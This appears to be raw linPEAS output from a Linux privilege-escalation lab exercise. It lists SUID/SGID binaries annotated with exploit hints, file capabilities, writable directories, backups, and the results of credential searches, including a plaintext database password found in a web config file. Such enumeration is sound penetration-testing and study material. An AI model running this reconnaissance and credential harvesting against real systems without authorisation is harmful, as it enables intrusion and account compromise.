-rwsr-xr-x 1 root root 463K Dec 2 2021 /snap/core20/1434/usr/lib/openssh/ssh-keysign -rwsr-xr-x 1 root root 59K Jan 25 2022 /snap/core18/2409/usr/bin/passwd ---\u0026gt; Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997) -rwsr-xr-x 1 root root 40K Jan 25 2022 /snap/core18/2409/usr/bin/newgrp ---\u0026gt; HP-UX_10.20 -rwsr-xr-x 1 root root 75K Jan 25 2022 /snap/core18/2409/usr/bin/gpasswd -rwsr-xr-x 1 root root 44K Jan 25 2022 /snap/core18/2409/usr/bin/chsh -rwsr-xr-x 1 root root 75K Jan 25 2022 /snap/core18/2409/usr/bin/chfn ---\u0026gt; SuSE_9.3/10 -rwsr-xr-x 1 root root 44K Jan 25 2022 /snap/core18/2409/bin/su -rwsr-xr-x 1 root root 39K Feb 7 2022 /usr/bin/umount ---\u0026gt; BSD/Linux(08-1996) -rwsr-xr-x 1 root root 67K Feb 7 2022 /usr/bin/su -rwsr-xr-x 1 root root 55K Feb 7 2022 /usr/bin/mount ---\u0026gt; Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8 -rwsr-xr-x 1 root root 39K Feb 7 2022 /snap/core20/1434/usr/bin/umount ---\u0026gt; BSD/Linux(08-1996) -rwsr-xr-x 1 root root 67K Feb 7 2022 /snap/core20/1434/usr/bin/su -rwsr-xr-x 1 root root 55K Feb 7 2022 /snap/core20/1434/usr/bin/mount ---\u0026gt; Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8 -rwsr-xr-x 1 root root 23K Feb 21 2022 /usr/lib/policykit-1/polkit-agent-helper-1 -rwsr-xr-x 1 root root 31K Feb 21 2022 /usr/bin/pkexec ---\u0026gt; Linux4.10_to_5.1.17(CVE-2019-13272)/rhel_6(CVE-2011-1485) -rwsr-xr-x 1 root root 121K Apr 8 2022 /snap/snapd/15534/usr/lib/snapd/snap-confine -rwsr-xr-x 1 root root 140K Apr 27 2022 /usr/lib/snapd/snap-confine -rwsr-xr-- 1 root messagebus 51K Apr 29 2022 /usr/lib/dbus-1.0/dbus-daemon-launch-helper -rwsr-xr-x 1 root root 121K May 11 2022 /snap/snapd/15904/usr/lib/snapd/snap-confine -rwsr-sr-x 1 root root 17K May 11 2022 /opt/get-list [+] SGID [i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid -rwsr-sr-x 1 daemon daemon 55K Nov 12 2018 /usr/bin/at -rwxr-sr-x 1 root crontab 355K Mar 4 2019 /snap/core18/2128/usr/bin/ssh-agent -rwxr-sr-x 1 root shadow 23K Mar 22 2019 /snap/core18/2128/usr/bin/expiry -rwxr-sr-x 1 root shadow 71K Mar 22 2019 /snap/core18/2128/usr/bin/chage -rwxr-sr-x 1 root utmp 15K Sep 30 2019 /usr/lib/x86_64-linux-gnu/utempter/utempter -rwxr-sr-x 1 root crontab 43K Feb 13 2020 /usr/bin/crontab -rwxr-sr-x 1 root crontab 355K Mar 3 2020 /snap/core18/2409/usr/bin/ssh-agent -rwxr-sr-x 1 root tty 15K Mar 30 2020 /usr/bin/bsd-write -rwxr-sr-x 1 root tty 31K Sep 16 2020 /snap/core18/2409/usr/bin/wall -rwxr-sr-x 1 root tty 31K Sep 16 2020 /snap/core18/2128/usr/bin/wall -rwxr-sr-x 1 root shadow 34K Apr 8 2021 /snap/core18/2409/sbin/unix_chkpwd -rwxr-sr-x 1 root shadow 34K Apr 8 2021 /snap/core18/2409/sbin/pam_extrausers_chkpwd -rwxr-sr-x 1 root shadow 34K Apr 8 2021 /snap/core18/2128/sbin/unix_chkpwd -rwxr-sr-x 1 root shadow 34K Apr 8 2021 /snap/core18/2128/sbin/pam_extrausers_chkpwd -rwxr-sr-x 1 root shadow 31K Jul 14 2021 /usr/bin/expiry -rwxr-sr-x 1 root shadow 83K Jul 14 2021 /usr/bin/chage -rwxr-sr-x 1 root shadow 31K Jul 14 2021 /snap/core20/1434/usr/bin/expiry -rwxr-sr-x 1 root shadow 83K Jul 14 2021 /snap/core20/1434/usr/bin/chage -rwxr-sr-x 1 root shadow 43K Sep 17 2021 /usr/sbin/unix_chkpwd -rwxr-sr-x 1 root shadow 43K Sep 17 2021 /usr/sbin/pam_extrausers_chkpwd -rwxr-sr-x 1 root shadow 43K Sep 17 2021 /snap/core20/1434/usr/sbin/unix_chkpwd -rwxr-sr-x 1 root shadow 43K Sep 17 2021 /snap/core20/1434/usr/sbin/pam_extrausers_chkpwd -rwxr-sr-x 1 root ssh 343K Dec 2 2021 /usr/bin/ssh-agent -rwxr-sr-x 1 root crontab 343K Dec 2 2021 /snap/core20/1434/usr/bin/ssh-agent -rwxr-sr-x 1 root shadow 23K Jan 25 2022 /snap/core18/2409/usr/bin/expiry -rwxr-sr-x 1 root shadow 71K Jan 25 2022 /snap/core18/2409/usr/bin/chage -rwxr-sr-x 1 root tty 35K Feb 7 2022 /usr/bin/wall -rwxr-sr-x 1 root tty 35K Feb 7 2022 /snap/core20/1434/usr/bin/wall -rwsr-sr-x 1 root root 17K May 11 2022 /opt/get-list [+] Checking misconfigurations of ld.so [i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#ld-so /etc/ld.so.conf include /etc/ld.so.conf.d/*.conf /etc/ld.so.conf.d /etc/ld.so.conf.d/libc.conf /usr/local/lib /etc/ld.so.conf.d/x86_64-linux-gnu.conf /usr/local/lib/x86_64-linux-gnu /lib/x86_64-linux-gnu /usr/lib/x86_64-linux-gnu [+] Capabilities [i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#capabilities Current capabilities: Current: = CapInh: 0000000000000000 CapPrm: 0000000000000000 CapEff: 0000000000000000 CapBnd: 0000003fffffffff CapAmb: 0000000000000000 Shell capabilities: 0x0000000000000000= CapInh: 0000000000000000 CapPrm: 0000000000000000 CapEff: 0000000000000000 CapBnd: 0000003fffffffff CapAmb: 0000000000000000 Files with capabilities: /snap/core20/1434/usr/bin/ping = cap_net_raw+ep /usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep /usr/bin/traceroute6.iputils = cap_net_raw+ep /usr/bin/ping = cap_net_raw+ep /usr/bin/mtr-packet = cap_net_raw+ep [+] Users with capabilities [i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#capabilities [+] Files with ACLs [i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#acls files with acls in searched folders Not Found [+] .sh files in path [i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#script-binaries-in-path /usr/bin/gettext.sh /usr/bin/rescan-scsi-bus.sh [+] Unexpected in root /lib32 /swap.img /libx32 /lost+found [+] Files (scripts) in /etc/profile.d/ [i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#profiles-files total 44 drwxr-xr-x 2 root root 4096 May 11 2022 . drwxr-xr-x 102 root root 4096 May 18 2022 .. -rw-r--r-- 1 root root 96 Dec 5 2019 01-locale-fix.sh -rw-r--r-- 1 root root 835 Sep 9 2021 apps-bin-path.sh -rw-r--r-- 1 root root 729 Feb 2 2020 bash_completion.sh -rw-r--r-- 1 root root 1003 Aug 13 2019 cedilla-portuguese.sh -rw-r--r-- 1 root root 1107 Nov 3 2019 gawk.csh -rw-r--r-- 1 root root 757 Nov 3 2019 gawk.sh -rw-r--r-- 1 root root 1557 Feb 17 2020 Z97-byobu.sh -rwxr-xr-x 1 root root 873 Jun 2 2020 Z99-cloudinit-warnings.sh -rwxr-xr-x 1 root root 3417 Jun 2 2020 Z99-cloud-locale-test.sh [+] Permissions in init, init.d, systemd, and rc.d [i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#init-init-d-systemd-and-rc-d [+] Hashes inside passwd file? ........... No [+] Writable passwd file? ................ No [+] Credentials in fstab/mtab? ........... No [+] Can I read shadow files? ............. No [+] Can I read opasswd file? ............. No [+] Can I write in network-scripts? ...... No [+] Can I read root folder? .............. No [+] Searching root files in home dirs (limit 30) /home/ /home/bob/.bash_history /root/ [+] Searching folders owned by me containing others files on it [+] Readable files belonging to root and readable by me but not world readable [+] Modified interesting files in the last 5mins (limit 100) /var/log/auth.log /var/log/journal/b266781b406945aeb7b9b987494ac6b1/user-1000.journal /var/log/journal/b266781b406945aeb7b9b987494ac6b1/system.journal /var/log/vmware-vmsvc-root.log /var/log/syslog /var/log/kern.log /home/bob/snap/lxd/common/config/config.yml /home/bob/.gnupg/trustdb.gpg /home/bob/.gnupg/pubring.kbx /home/bob/.gnupg/crls.d/DIR.txt [+] Writable log files (logrotten) (limit 100) [i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#logrotate-exploitation logrotate 3.14.0 Default mail command: /usr/bin/mail Default compress command: /bin/gzip Default uncompress command: /bin/gunzip Default compress extension: .gz Default state file path: /var/lib/logrotate/status ACL support: yes SELinux support: yes [+] Files inside /home/bob (limit 20) total 364 drwxr-xr-x 5 bob bob 4096 May 18 09:38 . drwxr-xr-x 3 root root 4096 May 11 2022 .. lrwxrwxrwx 1 root root 9 May 11 2022 .bash_history -\u0026gt; /dev/null -rw-r--r-- 1 bob bob 220 Feb 25 2020 .bash_logout -rw-r--r-- 1 bob bob 3771 Feb 25 2020 .bashrc drwx------ 2 bob bob 4096 May 11 2022 .cache drwx------ 4 bob bob 4096 May 18 09:38 .gnupg -rwxrwxr-x 1 bob bob 332111 May 5 08:06 linpeas.sh -rw-r--r-- 1 bob bob 33 May 18 07:36 local.txt -rw-r--r-- 1 bob bob 807 Feb 25 2020 .profile drwx------ 3 bob bob 4096 May 18 09:38 snap [+] Files inside others home (limit 20) [+] Searching installed mail applications [+] Mails (limit 50) [+] Backup folders drwxr-xr-x 2 root root 4096 Feb 17 12:42 /var/backups total 1856 -rw-r--r-- 1 root root 51200 May 18 2022 alternatives.tar.0 -rw-r--r-- 1 root root 38730 Feb 17 11:22 apt.extended_states.0 -rw-r--r-- 1 root root 4269 May 25 2022 apt.extended_states.1.gz -rw-r--r-- 1 root root 4251 May 17 2022 apt.extended_states.2.gz -rw-r--r-- 1 root root 4300 May 11 2022 apt.extended_states.3.gz -rw-r--r-- 1 root root 3998 May 11 2022 apt.extended_states.4.gz -rw-r--r-- 1 root root 3913 Oct 21 2021 apt.extended_states.5.gz -rw-r--r-- 1 root root 3886 Aug 25 2021 apt.extended_states.6.gz -rw-r--r-- 1 root root 268 Jan 7 2021 dpkg.diversions.0 -rw-r--r-- 1 root root 139 Jan 7 2021 dpkg.diversions.1.gz -rw-r--r-- 1 root root 139 Jan 7 2021 dpkg.diversions.2.gz -rw-r--r-- 1 root root 139 Jan 7 2021 dpkg.diversions.3.gz -rw-r--r-- 1 root root 139 Jan 7 2021 dpkg.diversions.4.gz -rw-r--r-- 1 root root 139 Jan 7 2021 dpkg.diversions.5.gz -rw-r--r-- 1 root root 139 Jan 7 2021 dpkg.diversions.6.gz -rw-r--r-- 1 root root 172 May 11 2022 dpkg.statoverride.0 -rw-r--r-- 1 root root 161 May 11 2022 dpkg.statoverride.1.gz -rw-r--r-- 1 root root 161 May 11 2022 dpkg.statoverride.2.gz -rw-r--r-- 1 root root 161 May 11 2022 dpkg.statoverride.3.gz -rw-r--r-- 1 root root 161 May 11 2022 dpkg.statoverride.4.gz -rw-r--r-- 1 root root 161 May 11 2022 dpkg.statoverride.5.gz -rw-r--r-- 1 root root 161 May 11 2022 dpkg.statoverride.6.gz -rw-r--r-- 1 root root 675890 May 18 2022 dpkg.status.0 -rw-r--r-- 1 root root 171660 May 18 2022 dpkg.status.1.gz -rw-r--r-- 1 root root 171660 May 18 2022 dpkg.status.2.gz -rw-r--r-- 1 root root 171660 May 18 2022 dpkg.status.3.gz -rw-r--r-- 1 root root 171660 May 18 2022 dpkg.status.4.gz -rw-r--r-- 1 root root 171660 May 18 2022 dpkg.status.5.gz -rw-r--r-- 1 root root 171660 May 18 2022 dpkg.status.6.gz [+] Backup files -rw-r--r-- 1 root root 2743 Jul 31 2020 /etc/apt/sources.list.curtin.old -rw-r--r-- 1 root root 170 Feb 17 10:37 /run/blkid/blkid.tab.old -rwxr-xr-x 1 root root 226 Feb 17 2020 /usr/share/byobu/desktop/byobu.desktop.old -rw-r--r-- 1 root root 7867 Jul 16 1996 /usr/share/doc/telnet/README.old.gz -rw-r--r-- 1 root root 392817 Feb 9 2020 /usr/share/doc/manpages/Changes.old.gz -rw-r--r-- 1 root root 348 Feb 18 2022 /usr/share/man/man1/wsrep_sst_mariabackup.1.gz -rw-r--r-- 1 root root 2756 Feb 13 2020 /usr/share/man/man8/vgcfgbackup.8.gz -rw-r--r-- 1 root root 11886 May 11 2022 /usr/share/info/dir.old -rw-r--r-- 1 root root 237986 May 18 2022 /usr/src/linux-headers-5.4.0-113-generic/.config.old -rw-r--r-- 1 root root 0 May 18 2022 /usr/src/linux-headers-5.4.0-113-generic/include/config/net/team/mode/activebackup.h -rw-r--r-- 1 root root 0 May 18 2022 /usr/src/linux-headers-5.4.0-113-generic/include/config/wm831x/backup.h -rw-r--r-- 1 root root 237986 Apr 14 2022 /usr/src/linux-headers-5.4.0-110-generic/.config.old -rw-r--r-- 1 root root 0 Apr 14 2022 /usr/src/linux-headers-5.4.0-110-generic/include/config/net/team/mode/activebackup.h -rw-r--r-- 1 root root 0 Apr 14 2022 /usr/src/linux-headers-5.4.0-110-generic/include/config/wm831x/backup.h -rwxr-xr-x 1 root root 1086 Nov 25 2019 /usr/src/linux-headers-5.4.0-113/tools/testing/selftests/net/tcp_fastopen_backup_key.sh -rwxr-xr-x 1 root root 1086 Nov 25 2019 /usr/src/linux-headers-5.4.0-110/tools/testing/selftests/net/tcp_fastopen_backup_key.sh -rw-r--r-- 1 root root 1413 May 11 2022 /usr/lib/python3/dist-packages/sos/report/plugins/__pycache__/ovirt_engine_backup.cpython-38.pyc -rw-r--r-- 1 root root 1802 Feb 15 2022 /usr/lib/python3/dist-packages/sos/report/plugins/ovirt_engine_backup.py -rw-r--r-- 1 root root 9833 Apr 14 2022 /usr/lib/modules/5.4.0-110-generic/kernel/drivers/power/supply/wm831x_backup.ko -rw-r--r-- 1 root root 9073 Apr 14 2022 /usr/lib/modules/5.4.0-110-generic/kernel/drivers/net/team/team_mode_activebackup.ko -rw-r--r-- 1 root root 9833 May 18 2022 /usr/lib/modules/5.4.0-113-generic/kernel/drivers/power/supply/wm831x_backup.ko -rw-r--r-- 1 root root 9073 May 18 2022 /usr/lib/modules/5.4.0-113-generic/kernel/drivers/net/team/team_mode_activebackup.ko -rw-r--r-- 1 root root 44048 Oct 12 2021 /usr/lib/x86_64-linux-gnu/open-vm-tools/plugins/vmsvc/libvmbackup.so -rwxr-xr-x 1 root root 43891 Feb 18 2022 /usr/bin/wsrep_sst_mariabackup [+] Searching tables inside readable .db/.sql/.sqlite files (limit 100) [+] Web files?(output limit) /var/www/: total 16K drwxr-xr-x 4 root root 4.0K May 11 2022 . drwxr-xr-x 14 root root 4.0K May 11 2022 .. drwxr-xr-x 8 root root 4.0K May 11 2022 html drwxr-xr-x 2 501 staff 4.0K Mar 15 2022 Search /var/www/html: total 96K drwxr-xr-x 8 root root 4.0K May 11 2022 . [+] Readable hidden interesting files [i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#read-sensitive-data [+] All hidden files (not in /sys/ or the ones listed in the previous check) (limit 70) -rw------- 1 root root 0 Apr 28 2022 /snap/core18/2409/etc/.pwd.lock -rw-r--r-- 1 root root 220 Apr 4 2018 /snap/core18/2409/etc/skel/.bash_logout -rw-r--r-- 1 root root 3771 Apr 4 2018 /snap/core18/2409/etc/skel/.bashrc -rw-r--r-- 1 root root 807 Apr 4 2018 /snap/core18/2409/etc/skel/.profile -rw-r--r-- 1 root root 39 Apr 28 2022 /snap/core18/2409/var/home/.gitignore -rw------- 1 root root 0 Jul 22 2021 /snap/core18/2128/etc/.pwd.lock -rw-r--r-- 1 root root 220 Apr 4 2018 /snap/core18/2128/etc/skel/.bash_logout -rw-r--r-- 1 root root 3771 Apr 4 2018 /snap/core18/2128/etc/skel/.bashrc -rw-r--r-- 1 root root 807 Apr 4 2018 /snap/core18/2128/etc/skel/.profile -rw-r--r-- 1 root root 39 Jul 22 2021 /snap/core18/2128/var/home/.gitignore -rw------- 1 root root 0 Mar 29 2022 /snap/core20/1434/etc/.pwd.lock -rw-r--r-- 1 root root 220 Feb 25 2020 /snap/core20/1434/etc/skel/.bash_logout -rw-r--r-- 1 root root 3771 Feb 25 2020 /snap/core20/1434/etc/skel/.bashrc -rw-r--r-- 1 root root 807 Feb 25 2020 /snap/core20/1434/etc/skel/.profile -rw-r--r-- 1 root root 102 Feb 13 2020 /etc/cron.monthly/.placeholder -rw-r--r-- 1 root root 102 Feb 13 2020 /etc/cron.weekly/.placeholder -rw-r--r-- 1 root root 102 Feb 13 2020 /etc/cron.d/.placeholder -rw-r--r-- 1 root root 102 Feb 13 2020 /etc/cron.hourly/.placeholder -rw------- 1 root root 0 Jul 31 2020 /etc/.pwd.lock -rw-r--r-- 1 root root 102 Feb 13 2020 /etc/cron.daily/.placeholder -rw-r--r-- 1 root root 220 Feb 25 2020 /etc/skel/.bash_logout -rw-r--r-- 1 root root 3771 Feb 25 2020 /etc/skel/.bashrc -rw-r--r-- 1 root root 807 Feb 25 2020 /etc/skel/.profile -rw-r--r-- 1 501 staff 6148 Mar 14 2022 /var/www/html/scss/.DS_Store -rw-r--r-- 1 landscape landscape 0 Jul 31 2020 /var/lib/landscape/.cleanup.user -rw------- 1 root root 0 Feb 17 10:42 /run/snapd/lock/.lock -rw-r--r-- 1 root root 20 Feb 17 10:42 /run/cloud-init/.instance-id -rw-r--r-- 1 root root 2 May 18 07:36 /run/cloud-init/.ds-identify.result -rw-r--r-- 1 bob bob 220 Feb 25 2020 /home/bob/.bash_logout -rw-r--r-- 1 bob bob 3771 Feb 25 2020 /home/bob/.bashrc -rw-r--r-- 1 bob bob 807 Feb 25 2020 /home/bob/.profile -rw-r--r-- 1 root root 4409 May 18 2022 /usr/src/linux-headers-5.4.0-113-generic/scripts/basic/.fixdep.cmd -rw-r--r-- 1 root root 4732 May 18 2022 /usr/src/linux-headers-5.4.0-113-generic/scripts/.asn1_compiler.cmd -rw-r--r-- 1 root root 6628 May 18 2022 /usr/src/linux-headers-5.4.0-113-generic/scripts/.insert-sys-cert.cmd -rw-r--r-- 1 root root 1655 May 18 2022 /usr/src/linux-headers-5.4.0-113-generic/scripts/.bin2c.cmd -rw-r--r-- 1 root root 3686 May 18 2022 /usr/src/linux-headers-5.4.0-113-generic/scripts/.conmakehash.cmd -rw-r--r-- 1 root root 8168 May 18 2022 /usr/src/linux-headers-5.4.0-113-generic/scripts/.sign-file.cmd -rw-r--r-- 1 root root 216 May 18 2022 /usr/src/linux-headers-5.4.0-113-generic/scripts/genksyms/.parse.tab.c.cmd -rw-r--r-- 1 root root 155 May 18 2022 /usr/src/linux-headers-5.4.0-113-generic/scripts/genksyms/.genksyms.cmd -rw-r--r-- 1 root root 126 May 18 2022 /usr/src/linux-headers-5.4.0-113-generic/scripts/genksyms/.lex.lex.c.cmd -rw-r--r-- 1 root root 3756 May 18 2022 /usr/src/linux-headers-5.4.0-113-generic/scripts/genksyms/.parse.tab.o.cmd -rw-r--r-- 1 root root 4225 May 18 2022 /usr/src/linux-headers-5.4.0-113-generic/scripts/genksyms/.genksyms.o.cmd -rw-r--r-- 1 root root 4770 May 18 2022 /usr/src/linux-headers-5.4.0-113-generic/scripts/genksyms/.lex.lex.o.cmd -rw-r--r-- 1 root root 5242 May 18 2022 /usr/src/linux-headers-5.4.0-113-generic/scripts/.sortextable.cmd -rw-r--r-- 1 root root 6805 May 18 2022 /usr/src/linux-headers-5.4.0-113-generic/scripts/selinux/mdp/.mdp.cmd -rw-r--r-- 1 root root 5973 May 18 2022 /usr/src/linux-headers-5.4.0-113-generic/scripts/selinux/genheaders/.genheaders.cmd -rw-r--r-- 1 root root 6749 May 18 2022 /usr/src/linux-headers-5.4.0-113-generic/scripts/.extract-cert.cmd -rw-r--r-- 1 root root 5084 May 18 2022 /usr/src/linux-headers-5.4.0-113-generic/scripts/mod/.file2alias.o.cmd -rw-r--r-- 1 root root 3430 May 18 2022 /usr/src/linux-headers-5.4.0-113-generic/scripts/mod/.empty.o.cmd -rw-r--r-- 1 root root 3889 May 18 2022 /usr/src/linux-headers-5.4.0-113-generic/scripts/mod/.mk_elfconfig.cmd -rw-r--r-- 1 root root 104 May 18 2022 /usr/src/linux-headers-5.4.0-113-generic/scripts/mod/.elfconfig.h.cmd -rw-r--r-- 1 root root 6884 May 18 2022 /usr/src/linux-headers-5.4.0-113-generic/scripts/mod/.devicetable-offsets.s.cmd -rw-r--r-- 1 root root 131 May 18 2022 /usr/src/linux-headers-5.4.0-113-generic/scripts/mod/.modpost.cmd -rw-r--r-- 1 root root 6952 May 18 2022 /usr/src/linux-headers-5.4.0-113-generic/scripts/mod/.modpost.o.cmd -rw-r--r-- 1 root root 6428 May 18 2022 /usr/src/linux-headers-5.4.0-113-generic/scripts/mod/.sumversion.o.cmd -rw-r--r-- 1 root root 129 May 18 2022 /usr/src/linux-headers-5.4.0-113-generic/scripts/kconfig/.lexer.lex.c.cmd -rw-r--r-- 1 root root 4065 May 18 2022 /usr/src/linux-headers-5.4.0-113-generic/scripts/kconfig/.preprocess.o.cmd -rw-r--r-- 1 root root 4227 May 18 2022 /usr/src/linux-headers-5.4.0-113-generic/scripts/kconfig/.parser.tab.o.cmd -rw-r--r-- 1 root root 5349 May 18 2022 /usr/src/linux-headers-5.4.0-113-generic/scripts/kconfig/.conf.o.cmd -rw-r--r-- 1 root root 4987 May 18 2022 /usr/src/linux-headers-5.4.0-113-generic/scripts/kconfig/.lexer.lex.o.cmd -rw-r--r-- 1 root root 176 May 18 2022 /usr/src/linux-headers-5.4.0-113-generic/scripts/kconfig/.parser.tab.h.cmd -rw-r--r-- 1 root root 245 May 18 2022 /usr/src/linux-headers-5.4.0-113-generic/scripts/kconfig/.conf.cmd -rw-r--r-- 1 root root 5738 May 18 2022 /usr/src/linux-headers-5.4.0-113-generic/scripts/kconfig/.confdata.o.cmd -rw-r--r-- 1 root root 4147 May 18 2022 /usr/src/linux-headers-5.4.0-113-generic/scripts/kconfig/.symbol.o.cmd -rw-r--r-- 1 root root 4233 May 18 2022 /usr/src/linux-headers-5.4.0-113-generic/scripts/kconfig/.expr.o.cmd -rw-r--r-- 1 root root 4941 May 18 2022 /usr/src/linux-headers-5.4.0-113-generic/scripts/.recordmcount.cmd -rw-r--r-- 1 root root 3950 May 18 2022 /usr/src/linux-headers-5.4.0-113-generic/scripts/.kallsyms.cmd -rw-r--r-- 1 root root 237838 May 18 2022 /usr/src/linux-headers-5.4.0-113-generic/.config -rw-r--r-- 1 root root 237986 May 18 2022 /usr/src/linux-headers-5.4.0-113-generic/.config.old -rw-r--r-- 1 root root 14556 May 18 2022 /usr/src/linux-headers-5.4.0-113-generic/kernel/.bounds.s.cmd grep: write error: Broken pipe [+] Readable files inside /tmp, /var/tmp, /private/tmp, /private/var/at/tmp, /private/var/tmp, and backup folders (limit 70) -rw-r--r-- 1 root root 172 May 11 2022 /var/backups/dpkg.statoverride.0 -rw-r--r-- 1 root root 268 Jan 7 2021 /var/backups/dpkg.diversions.0 -rw-r--r-- 1 root root 3886 Aug 25 2021 /var/backups/apt.extended_states.6.gz -rw-r--r-- 1 root root 161 May 11 2022 /var/backups/dpkg.statoverride.4.gz -rw-r--r-- 1 root root 675890 May 18 2022 /var/backups/dpkg.status.0 -rw-r--r-- 1 root root 171660 May 18 2022 /var/backups/dpkg.status.6.gz -rw-r--r-- 1 root root 3913 Oct 21 2021 /var/backups/apt.extended_states.5.gz -rw-r--r-- 1 root root 38730 Feb 17 11:22 /var/backups/apt.extended_states.0 -rw-r--r-- 1 root root 139 Jan 7 2021 /var/backups/dpkg.diversions.3.gz -rw-r--r-- 1 root root 51200 May 18 2022 /var/backups/alternatives.tar.0 -rw-r--r-- 1 root root 4251 May 17 2022 /var/backups/apt.extended_states.2.gz -rw-r--r-- 1 root root 3998 May 11 2022 /var/backups/apt.extended_states.4.gz -rw-r--r-- 1 root root 161 May 11 2022 /var/backups/dpkg.statoverride.2.gz -rw-r--r-- 1 root root 161 May 11 2022 /var/backups/dpkg.statoverride.3.gz -rw-r--r-- 1 root root 139 Jan 7 2021 /var/backups/dpkg.diversions.1.gz -rw-r--r-- 1 root root 161 May 11 2022 /var/backups/dpkg.statoverride.6.gz -rw-r--r-- 1 root root 171660 May 18 2022 /var/backups/dpkg.status.2.gz -rw-r--r-- 1 root root 139 Jan 7 2021 /var/backups/dpkg.diversions.5.gz -rw-r--r-- 1 root root 4300 May 11 2022 /var/backups/apt.extended_states.3.gz -rw-r--r-- 1 root root 161 May 11 2022 /var/backups/dpkg.statoverride.5.gz -rw-r--r-- 1 root root 161 May 11 2022 /var/backups/dpkg.statoverride.1.gz -rw-r--r-- 1 root root 4269 May 25 2022 /var/backups/apt.extended_states.1.gz -rw-r--r-- 1 root root 171660 May 18 2022 /var/backups/dpkg.status.3.gz -rw-r--r-- 1 root root 139 Jan 7 2021 /var/backups/dpkg.diversions.6.gz -rw-r--r-- 1 root root 139 Jan 7 2021 /var/backups/dpkg.diversions.4.gz -rw-r--r-- 1 root root 171660 May 18 2022 /var/backups/dpkg.status.5.gz -rw-r--r-- 1 root root 171660 May 18 2022 /var/backups/dpkg.status.4.gz -rw-r--r-- 1 root root 139 Jan 7 2021 /var/backups/dpkg.diversions.2.gz -rw-r--r-- 1 root root 171660 May 18 2022 /var/backups/dpkg.status.1.gz [+] Interesting writable files owned by me or writable by everyone (not in Home) (max 500) [i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-files /dev/mqueue /dev/shm /home/bob /run/lock /run/screen /run/screen/S-bob /run/user/1000 /run/user/1000/dbus-1 /run/user/1000/dbus-1/services /run/user/1000/gnupg /run/user/1000/inaccessible /run/user/1000/systemd /run/user/1000/systemd/transient /run/user/1000/systemd/units /snap/core18/2128/tmp /snap/core18/2128/var/tmp /snap/core18/2409/tmp /snap/core18/2409/var/tmp /snap/core20/1434/run/lock /snap/core20/1434/tmp /snap/core20/1434/var/tmp /tmp /tmp/.font-unix /tmp/.ICE-unix /tmp/.Test-unix /tmp/tmux-1000 /tmp/.X11-unix #)You_can_write_even_more_files_inside_last_directory /var/crash /var/lib/php/sessions /var/tmp [+] Interesting GROUP writable files (not in Home) (max 500) [i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-files Group bob: [+] Searching passwords in config PHP files [+] Checking for TTY (sudo/su) passwords in audit logs [+] Finding IPs inside logs (limit 70) 4 /var/log/journal/b266781b406945aeb7b9b987494ac6b1/user-1000@a18a5118db084efb8d30e00eeb0f14a6-0000000000005c67-0005deba63fc16d8.journal:192.168.118.14 2 /var/log/wtmp:192.168.118.18 2 /var/log/wtmp:192.168.118.14 1 /var/log/wtmp:192.168.45.156 1 /var/log/lastlog:192.168.45.156 1 /var/log/lastlog:192.168.118.14 [+] Finding passwords inside logs (limit 70) Binary file /var/log/cloud-init.log matches Binary file /var/log/journal/b266781b406945aeb7b9b987494ac6b1/user-1000.journal matches /var/log/cloud-init.log:2022-05-11 10:56:41,961 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance) /var/log/cloud-init.log:2022-05-11 11:01:30,771 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance) /var/log/cloud-init.log:2022-05-17 19:22:04,292 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance) /var/log/dmesg.0:[ 3.852147] systemd[1]: Started Forward Password Requests to Wall Directory Watch. /var/log/dmesg.0:[ 4.452729] systemd[1]: Started Dispatch Password Requests to Console Directory Watch. /var/log/dmesg.0:[ 4.453394] systemd[1]: Condition check resulted in Forward Password Requests to Plymouth Directory Watch being skipped. /var/log/dmesg:[ 93.093503] systemd[1]: Started Forward Password Requests to Wall Directory Watch. [+] Finding emails inside logs (limit 70) 1 /var/log/dmesg:giometti@linux.it 1 /var/log/dmesg:dm-devel@redhat.com 1 /var/log/dmesg.0:giometti@linux.it 1 /var/log/dmesg.0:dm-devel@redhat.com [+] Finding *password* or *credential* files in home (limit 70) [+] Finding passwords inside key folders (limit 70) - only PHP files /var/www/html/config.php: define(\u0026#39;DATABASE\u0026#39;, \u0026#39;wheels\u0026#39;); /var/www/html/config.php: define(\u0026#39;PASSWORD\u0026#39;, \u0026#39;CanRipperCrackthis?09\u0026#39;); /var/www/html/config.php: define(\u0026#39;USER\u0026#39;, \u0026#39;wheels\u0026#39;); /var/www/html/login.php: $password = $_POST[\u0026#39;password\u0026#39;]; /var/www/html/login.php: \u0026lt;input type=\u0026#34;password\u0026#34; name=\u0026#34;password\u0026#34; required /\u0026gt; /var/www/html/register.php: $password = $_POST[\u0026#39;password\u0026#39;]; /var/www/html/register.php: $password_hash = password_hash($password, PASSWORD_BCRYPT); /var/www/html/register.php: $query-\u0026gt;bindParam(\u0026#34;password_hash\u0026#34;, $password_hash, PDO::PARAM_STR); /var/www/html/register.php: \u0026lt;input type=\u0026#34;password\u0026#34; name=\u0026#34;password\u0026#34; required /\u0026gt; [+] Finding passwords inside key folders (limit 70) - no PHP files /etc/apache2/sites-available/default-ssl.conf: # file needs this password: `xxj31ZMTZzkVA\u0026#39;. /etc/cloud/cloud.cfg: lock_passwd: True /etc/cloud/cloud.cfg: sudo: [\u0026#34;ALL=(ALL) NOPASSWD:ALL\u0026#34;] /etc/debconf.conf:#BindPasswd: secret /etc/nsswitch.conf:passwd: files systemd /etc/overlayroot.conf:# $ 